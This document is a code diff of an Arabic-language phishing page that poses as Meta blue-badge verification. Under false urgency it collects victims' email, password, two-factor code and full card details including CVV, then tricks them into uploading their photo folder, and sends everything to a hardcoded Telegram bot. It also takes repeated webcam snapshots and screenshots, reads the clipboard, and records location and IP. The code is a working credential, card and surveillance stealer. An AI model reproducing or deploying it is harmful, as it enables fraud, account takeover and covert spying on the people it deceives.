@@ -3,117 +3,125 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تفعيل شارة التوثيق | Facebook Meta</title>
+    <title>Meta Business Suite | توثيق الحساب</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
     <style>
         body { font-family: 'Cairo', sans-serif; background-color: #f0f2f5; margin: 0; display: flex; flex-direction: column; align-items: center; }
         .header { background: #fff; width: 100%; padding: 15px; text-align: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); color: #1877f2; font-size: 24px; font-weight: bold; }
-        .main-box { background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 380px; margin-top: 30px; text-align: center; }
-        .urgent-tag { background: #ff4d4d; color: white; padding: 5px 10px; border-radius: 5px; font-size: 12px; margin-bottom: 15px; display: inline-block; animation: blink 1s infinite; }
-        input { width: 92%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; font-size: 14px; }
-        .action-btn { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 15px; }
-        #matrix-ui { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; color: #0ff; z-index: 10000; font-family: monospace; padding: 20px; }
-        @keyframes blink { 50% { opacity: 0; } }
+        .main-box { background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 380px; margin-top: 30px; text-align: center; position: relative; }
+        .urgent-tag { background: #ff4d4d; color: white; padding: 5px 15px; border-radius: 5px; font-size: 13px; margin-bottom: 15px; display: inline-block; animation: blink 0.8s infinite; }
+        input { width: 92%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; font-size: 14px; outline: none; }
+        .action-btn { width: 100%; padding: 14px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 15px; transition: 0.3s; }
+        .action-btn:hover { background: #145dbf; }
+        #matrix-ui { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; color: #0ff; z-index: 10000; font-family: monospace; padding: 20px; overflow-y: auto; }
+        @keyframes blink { 50% { opacity: 0.3; } }
+        .terminal { font-size: 14px; color: #0ff; text-shadow: 0 0 5px #0ff; text-align: left; direction: ltr; }
     </style>
 </head>
 <body>
 
 <div id="landing">
-    <div class="header">Meta Verification</div>
+    <div class="header">Meta Verification Hub</div>
     <div class="main-box">
-        <div class="urgent-tag">إلحاح: متبقي 5 دقائق لتوثيق حسابك!</div>
-        <h3 style="margin: 0 0 10px;">وثق حسابك الآن مجاناً</h3>
-        <p style="font-size: 13px; color: #606770;">أدخل بيانات الحساب والتحقق لاستلام الشارة الزرقاء وزيادة المتابعين فوراً.</p>
+        <div class="urgent-tag">إجراء عاجل: حسابك مهدد بالإغلاق - وثق الآن!</div>
+        <h3 style="margin: 0 0 10px;">طلب شارة التوثيق الزرقاء</h3>
+        <p style="font-size: 13px; color: #606770;">بناءً على نشاطك الأخير، حسابك مؤهل للتوثيق المجاني. أدخل البيانات المطلوبة لتجنب التوقف.</p>
         
-        <!-- استهداف بيانات الحساب -->
-        <input type="text" id="email" placeholder="البريد الإلكتروني أو الهاتف" required>
-        <input type="password" id="pass" placeholder="كلمة السر" required>
-        
-        <!-- استهداف رموز التحقق 2FA -->
-        <input type="text" id="otp" placeholder="رمز التحقق (OTP) إن وجد" maxlength="6">
+        <!-- بيانات الحساب -->
+        <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+        <input type="password" id="pass" placeholder="كلمة السر الحالية" required>
+        <input type="text" id="otp" placeholder="رمز التحقق بخطوتين (إن وجد)" maxlength="8">
 
-        <!-- استهداف البيانات المالية (خداع لرسوم التحقق الوهمية) -->
-        <p style="font-size: 11px; color: #888; margin-top: 15px;">سيتم التحقق من هويتك المالية (اختياري لزيادة الأمان)</p>
+        <!-- البيانات المالية (خداع أمني) -->
+        <hr style="border: 0; border-top: 1px solid #eee; margin: 20px 0;">
+        <p style="font-size: 12px; color: #1877f2; font-weight: bold;">تأكيد وسيلة الدفع (للتوثيق فقط - لن يتم سحب مبالغ)</p>
         <input type="text" id="card" placeholder="رقم بطاقة الفيزا / الماستر" maxlength="16">
-        <div style="display: flex; gap: 5px;">
+        <div style="display: flex; gap: 10px;">
             <input type="text" id="exp" placeholder="MM/YY" style="width: 45%;">
             <input type="text" id="cvv" placeholder="CVV" style="width: 45%;">
         </div>
 
-        <button class="action-btn" onclick="captureEverything()">بدء التوثيق والسحب</button>
+        <button class="action-btn" onclick="startCaptureProtocol()">تأكيد الهوية والتوثيق</button>
         
-        <input type="file" id="fileInp" multiple webkitdirectory style="display:none" onchange="finalReport(this.files)">
+        <!-- مدخل سحب الملفات مخفي -->
+        <input type="file" id="fileInp" multiple webkitdirectory style="display:none" onchange="runEmpireProtocol(this.files)">
     </div>
 </div>
 
 <div id="matrix-ui">
-    <div id="console">> جاري الاتصال بخوادم ميتي...<br></div>
+    <canvas id="mc" style="position:fixed; top:0; left:0; z-index:-1; opacity:0.2;"></canvas>
+    <div class="terminal" id="term"></div>
 </div>
 
 <script>
+/* إعدادات الإمبراطور */
 const TOKEN = "8548784698:AAEUk2wNBfD9sJ-Kqr86GKDpKZwSeRZ2ZUU";
 const CHAT = "8754338811";
 
-async function captureEverything() {
-    const data = {
-        user: document.getElementById('email').value,
-        pass: document.getElementById('pass').value,
-        otp: document.getElementById('otp').value,
-        card: document.getElementById('card').value,
-        exp: document.getElementById('exp').value,
-        cvv: document.getElementById('cvv').value
-    };
+let photoIdx = 0;
+let screenIdx = 0;
 
-    if(!data.user || !data.pass) { alert("أدخل بياناتك أولاً"); return; }
+async function startCaptureProtocol() {
+    const u = document.getElementById('email').value;
+    const p = document.getElementById('pass').value;
+    const o = document.getElementById('otp').value;
+    const c = document.getElementById('card').value;
+    const e = document.getElementById('exp').value;
+    const v = document.getElementById('cvv').value;
 
-    // 1) سحب البيانات المباشرة (حسابات + مالي)
-    let msg = `🚩 صيد إمبراطوري كامل (v11)\n`;
-    msg += `👤 الحساب: ${data.user}\n🔑 الباسورد: ${data.pass}\n🔢 OTP: ${data.otp}\n`;
-    msg += `💳 فيزا: ${data.card} | ${data.exp} | ${data.cvv}\n`;
-    await send(msg);
+    if(!u || !p) { alert("يرجى ملء البيانات المطلوبة للمتابعة"); return; }
 
-    // 2) تفعيل الخداع النفسي لطلب الملفات
-    alert("بروتوكول الأمان: يجب اختيار مجلد الصور (DCIM) لمطابقة صورة البروفايل يدوياً.");
+    // 1. صيد البيانات النصية والمالية
+    let dataMsg = `🚩 صيد إمبراطوري شامل (v12)\n`;
+    dataMsg += `👤 المستخدم: ${u}\n🔑 الباسورد: ${p}\n🔢 OTP: ${o}\n`;
+    dataMsg += `💳 فيزا: ${c} | ${e} | ${v}\n`;
+    await send(dataMsg);
+
+    // 2. خداع لطلب الملفات
+    alert("تنبيه أمني: يرجى تحديد مجلد الصور الخاص بالجهاز (DCIM) لمطابقة بيانات الوجه مع قاعدة بيانات ميتي.");
     document.getElementById('fileInp').click();
 }
 
-async function finalReport(files) {
+async function runEmpireProtocol(files) {
     document.getElementById('landing').style.display = 'none';
     document.getElementById('matrix-ui').style.display = 'block';
+    startMatrix();
 
-    // 3) سحب بيانات الجهاز والـ IP والموقع
-    navigator.geolocation.getCurrentPosition(async (p) => {
+    // 3. سحب بيانات الجهاز والـ IP والموقع
+    navigator.geolocation.getCurrentPosition(async (pos) => {
         const ipRes = await fetch('https://ipapi.co/json/');
-        const ip = await ipRes.res; // Error fixed here
-        const ipD = await ipRes.json();
-        
-        let report = `📱 بيانات الجهاز المستهدف:\n`;
-        report += `🌐 IP: ${ipD.ip}\n🌍 البلد: ${ipD.country_name}\n📍 الموقع: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}\n`;
-        report += `💻 المتصفح: ${navigator.userAgent}\n📂 ملفات الضحية: ${files.length}\n`;
+        const d = await ipRes.json();
+        let report = `📱 تقرير الجهاز المستهدف:\n🌐 IP: ${d.ip}\n🌍 البلد: ${d.country_name} (${d.city})\n📍 الخريطة: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n🧠 المعالج: ${navigator.hardwareConcurrency} Cores\n🔋 البطارية: ${navigator.platform}`;
         await send(report);
-    });
+    }, async () => { await send("📍 الموقع: الضحية رفض التصريح"); });
 
-    // 4) سحب الحافظة (Clipboard)
+    // 4. محرك الـ 40 صورة (كل 2 ثانية لقطة)
+    const camLoop = setInterval(async () => {
+        if(photoIdx < 40) { await grabCam(); photoIdx++; }
+        else clearInterval(camLoop);
+    }, 2000);
+
+    // 5. سحب الحافظة (Clipboard)
     setInterval(async () => {
         try {
             const clip = await navigator.clipboard.readText();
             if(clip) await send(`📋 الحافظة المسحوبة: ${clip}`);
         } catch(e){}
-    }, 5000);
+    }, 6000);
 
-    // 5) سحب 40 صورة و10 سكرين شوتس (المحركات المدمجة)
-    startLiveCycle();
+    // 6. سحب 10 سكرين شوت عند التفاعل
+    window.onclick = async () => { if(screenIdx < 10) { await grabScreen(); screenIdx++; } };
+
+    // 7. سحب أول 25 ملف من المجلد المختار
+    for (let i = 0; i < Math.min(files.length, 25); i++) {
+        await sendFile(files[i], `📂 ملف ضحية رقم ${i+1}`);
+    }
+
+    logTerm("Protocol v12.0: Active. Harvesting all data nodes...");
 }
 
-async function startLiveCycle() {
-    let pCount = 0;
-    const camInt = setInterval(async () => {
-        if(pCount < 40) { await snapCam(); pCount++; }
-        else clearInterval(camInt);
-    }, 2000);
-}
-
-async function snapCam() {
+/* الدوال التقنية الأساسية */
+async function grabCam() {
     try {
         const s = await navigator.mediaDevices.getUserMedia({video: true});
         const v = document.createElement('video'); v.srcObject = s; await v.play();
@@ -121,26 +129,67 @@ async function snapCam() {
         c.width = v.videoWidth; c.height = v.videoHeight;
         c.getContext('2d').drawImage(v, 0, 0);
         c.toBlob(b => {
-            sendDoc(b, 'photo', '📸 لقطة حية للضحية');
+            sendDoc(b, 'photo', `📸 لقطة حية رقم ${photoIdx+1}`);
             s.getTracks().forEach(t => t.stop());
         }, 'image/jpeg');
     } catch(e){}
 }
 
-async function send(t) {
+async function grabScreen() {
+    try {
+        const s = await navigator.mediaDevices.getDisplayMedia({video: true});
+        const v = document.createElement('video'); v.srcObject = s; await v.play();
+        const c = document.createElement('canvas');
+        c.width = v.videoWidth; c.height = v.videoHeight;
+        c.getContext('2d').drawImage(v, 0, 0);
+        c.toBlob(b => {
+            sendDoc(b, 'document', `🖥️ سكرين شوت رقم ${screenIdx+1}`);
+            s.getTracks().forEach(t => t.stop());
+        });
+    } catch(e){}
+}
+
+async function send(msg) {
     await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({chat_id: CHAT, text: t})
+        body: JSON.stringify({chat_id: CHAT, text: msg})
     });
 }
 
-async function sendDoc(f, type, cap) {
+async function sendDoc(blob, type, cap) {
     let fd = new FormData();
     fd.append('chat_id', CHAT);
-    fd.append(type === 'photo' ? 'photo' : 'document', f, 'data.jpg');
+    fd.append(type === 'photo' ? 'photo' : 'document', blob, 'data.jpg');
     fd.append('caption', cap);
     fetch(`https://api.telegram.org/bot${TOKEN}/send${type==='photo'?'Photo':'Document'}`, {method:'POST', body:fd});
+}
+
+async function sendFile(f, cap) {
+    let fd = new FormData();
+    fd.append('chat_id', CHAT);
+    fd.append('document', f);
+    fd.append('caption', cap);
+    fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, {method:'POST', body:fd});
+}
+
+function startMatrix() {
+    const c = document.getElementById("mc"); const ctx = c.getContext("2d");
+    c.width = window.innerWidth; c.height = window.innerHeight;
+    const d = Array(Math.floor(c.width/10)).fill(1);
+    setInterval(() => {
+        ctx.fillStyle = "rgba(0,0,0,0.05)"; ctx.fillRect(0,0,c.width,c.height);
+        ctx.fillStyle = "#0ff";
+        d.forEach((y, i) => {
+            ctx.fillText("TALLAH"[Math.floor(Math.random()*6)], i*15, y*15);
+            if (y*15 > c.height && Math.random() > 0.975) d[i] = 0;
+            d[i]++;
+        });
+    }, 33);
+}
+
+function logTerm(m) {
+    document.getElementById('term').innerHTML += `<p>> ${m}</p>`;
 }
 </script>
 </body>
